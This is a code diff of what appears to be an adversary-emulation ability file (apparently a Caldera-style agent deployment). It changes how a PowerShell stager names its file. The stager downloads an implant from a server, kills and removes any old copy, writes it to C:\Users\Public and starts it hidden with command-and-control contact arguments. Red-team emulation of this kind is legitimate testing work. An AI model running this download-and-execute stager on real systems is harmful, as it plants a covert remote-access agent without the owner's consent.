@@ -69,9 +69,8 @@
           $wc.Headers.add("platform","windows");
           $wc.Headers.add("file","manx.go");
           $data=$wc.DownloadData($url);
-          $name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");
-          Get-Process | ? {$_.Path -like "C:\Users\Public\$name.exe"} | stop-process -f -ea $ErrAction;
-          rm -force "C:\Users\Public\$name.exe" -ea $ErrAction;
+          Get-Process | ? {$_.Path -like "C:\Users\Public\#{agents.implant_name}.exe"} | stop-process -f -ea $ErrAction;
+          rm -force "C:\Users\Public\#{agents.implant_name}.exe" -ea $ErrAction;
           ([io.file]::WriteAllBytes("C:\Users\Public\#{agents.implant_name}.exe",$data)) | Out-Null;
           Start-Process -FilePath C:\Users\Public\#{agents.implant_name}.exe -ArgumentList "-socket $socket -http $server -contact $contact" -WindowStyle hidden;
         variations:
@@ -86,8 +85,7 @@
               $wc.Headers.add("platform","windows");
               $wc.Headers.add("file","manx.go");
               $data=$wc.DownloadData($url);
-              $name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");
-              Get-Process | ? {$_.Path -like "C:\Users\Public\$name.exe"} | stop-process -f -ea $ErrAction;
-              rm -force "C:\Users\Public\$name.exe" -ea $ErrAction;
+              Get-Process | ? {$_.Path -like "C:\Users\Public\#{agents.implant_name}.exe"} | stop-process -f -ea $ErrAction;
+              rm -force "C:\Users\Public\#{agents.implant_name}.exe" -ea $ErrAction;
               ([io.file]::WriteAllBytes("C:\Users\Public\#{agents.implant_name}.exe",$data)) | Out-Null;
               Start-Process -FilePath C:\Users\Public\#{agents.implant_name}.exe -ArgumentList "-socket $socket -http $server -contact $contact" -WindowStyle hidden;
